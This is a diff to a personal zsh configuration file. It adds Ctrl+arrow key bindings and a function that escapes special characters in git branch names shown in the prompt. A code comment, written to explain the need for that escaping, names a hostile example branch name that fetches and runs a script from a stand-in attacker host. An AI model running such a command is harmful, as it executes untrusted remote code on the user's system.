@@ -1,7 +1,4 @@
 # ~/.zshrc
-# This is how I like my ZSH shell prompts. 
-# Template generated using Claude, then edited manually to achieve the best looking results.
-
 
 # ##### Completion #####
 zstyle :compinstall filename "$HOME/.zshrc"
@@ -23,6 +20,8 @@ setopt INTERACTIVE_COMMENTS   # allow # comments in interactive shell
 
 # ##### Key bindings #####
 bindkey -e                    # emacs-style (use -v for vi)
+bindkey "^[[1;5C" forward-word   # Ctrl + Right
+bindkey "^[[1;5D" backward-word  # Ctrl + Left
 
 # ##### Colors & aliases #####
 autoload -U colors && colors
@@ -49,5 +48,11 @@ TRAPALRM() {
     zle && zle reset-prompt
 }
 
-PROMPT=$'\n''%F{244}SINCE (%F{cyan}${_PROMPT_SINCE}%F{244}) UNTIL (%F{cyan}%D{%Y-%m-%d %H:%M:%S}%F{244}) - %F{green}%n@%m%f%F{244}[%F{yellow}${_PROMPT_IP}%f%F{244}] %F{blue}%~%f
+clean_branch() {
+    # sanatize and prints out the current git branch. Sanatizing is extremely important since we are running PROMPT_SUBST.
+    # We don't want evil people to name branches $(curl evil.com | sh)
+    git branch --show-current 2>/dev/null | sed 's/[$`(){}]/\\&/g'
+}
+
+PROMPT=$'\n''%F{244}SINCE (%F{cyan}${_PROMPT_SINCE}%F{244}) UNTIL (%F{cyan}%D{%Y-%m-%d %H:%M:%S}%F{244}) - %F{green}%n@%m%f%F{244}[%F{yellow}${_PROMPT_IP}%f%F{244}] %F{blue}%~%f %F{magenta}[$(clean_branch)]%f
 > $ '
